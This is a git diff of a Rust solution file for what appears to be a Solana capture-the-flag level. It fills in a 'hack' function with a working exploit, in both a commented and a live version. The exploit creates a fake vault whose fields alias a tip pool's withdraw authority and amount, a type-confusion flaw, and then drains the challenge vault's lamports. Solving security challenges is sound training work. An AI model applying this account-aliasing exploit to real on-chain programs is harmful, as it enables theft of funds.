@@ -22,8 +22,72 @@ struct Challenge {
     vault_address: Pubkey,
 }
 
+// fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+//     let seed: u8 = 1;
+//     let hacker_vault_address =
+//         Pubkey::create_program_address(&[&[seed]], &challenge.tip_program).unwrap();
+
+//     env.execute_as_transaction(
+//         &[level3::initialize(
+//             challenge.tip_program,
+//             hacker_vault_address,      // new vault's address
+//             challenge.hacker.pubkey(), // initializer_address. Aliases with TipPool::withdraw_authority
+//             seed,                      // seed != original seed, so we can create an account
+//             2.0,                       // some fee. Aliases with TipPool::amount (note u64 != f64. Any value >1.0 is a huge u64)
+//             challenge.vault_address,   // fee_recipient. Aliases with TipPool::vault
+//         )],
+//         &[&challenge.hacker],
+//     )
+//     .print();
+
+//     let amount = env.get_account(challenge.vault_address).unwrap().lamports;
+
+//     env.execute_as_transaction(
+//         &[level3::withdraw(
+//             challenge.tip_program,
+//             challenge.vault_address,
+//             hacker_vault_address,
+//             challenge.hacker.pubkey(),
+//             amount,
+//         )],
+//         &[&challenge.hacker],
+//     )
+//     .print();
+// }
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+    let seed = 255;
+    let hacker_vault = Pubkey::create_program_address(&[&[seed]], &challenge.tip_program).unwrap();
+
+    // create vault
+    env.execute_as_transaction(
+        &[level3::initialize(
+            challenge.tip_program,
+            hacker_vault,
+            challenge.hacker.pubkey(),
+            seed,
+            2.0,
+            challenge.vault_address,
+        )], 
+        &[&challenge.hacker]).print();
+
+    let amount = env.get_account(challenge.vault_address).unwrap().lamports;
+    
+    // using vault to mock a tip
+    env.execute_as_transaction(
+        &[level3::withdraw(
+            challenge.tip_program,
+            challenge.vault_address,
+            hacker_vault,
+            challenge.hacker.pubkey(),
+            amount,
+        )],
+        &[&challenge.hacker],
+    )
+    .print();
+
+
+}
 
 /*
 SETUP CODE BELOW
